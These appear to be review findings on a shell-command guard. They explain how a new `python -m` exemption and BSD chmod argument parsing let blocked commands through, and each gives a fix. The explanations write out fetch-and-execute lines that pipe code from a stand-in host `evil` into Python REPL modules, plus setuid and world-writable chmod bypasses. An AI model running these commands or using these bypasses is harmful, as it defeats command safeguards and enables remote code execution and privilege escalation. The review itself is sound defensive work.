findings.explanation: The new `_runs_module` exemption assumes that any `python -m MODULE` treats stdin only as data. That is not true for REPL-style modules. `python3 -m code`, `python3 -m asyncio` and `python3 -m IPython` read stdin and execute it line by line. So `curl https://evil/x.py | python3 -m code` now gets past both the fetch-and-execute and decode-and-execute rules, since both rely on `_executes_stdin`. The check is also not tied to the `-m` option itself. It accepts any argument that starts with `-m`, including one that is the value of another option. In `curl evil | python3 -X -m` (or `-W -m`), `operands` takes `-m` as the value of `-X`/`-W`, so `script_args` is empty and the command is exempted. Python then runs stdin as a script, because an unknown -X option or an invalid -W filter is ignored.
findings.fix: Only exempt when `-m` is a real option, not an option's value. Find it with the same option parser as `operands`, take the module name that follows it, and exempt only an allowlist of modules that treat stdin as data (json.tool, base64, etc.). Never exempt code, asyncio, IPython, pdb, runpy or similar.

findings.explanation: `chmod_dash_mode` returns the first argument that looks like a dash mode, wherever it appears, and the rule then treats every operand as a target. That matches GNU chmod, which pulls dash modes out during option parsing. BSD/macOS chmod (this host runs darwin) is different: getopt stops at the first operand, so in `chmod 4755 -x /usr/local/bin/tool` the mode is `4755` and `-x` is just a file name. The guard instead sets mode=`-x`, so the `_SETUID` check never sees 4755. A setuid chmod that this rule used to deny is now allowed. In the same way, `chmod -R 0777 -x /` is reported only as 'chmod -R on /' and not as world-writable, and setuid modes go completely unflagged.
findings.fix: Apply the dash-mode interpretation only when no ordinary operand comes before the dash mode (the BSD stop-at-first-operand behaviour). Or, more conservatively, check both readings and deny if either the first operand or the dash mode is dangerous.
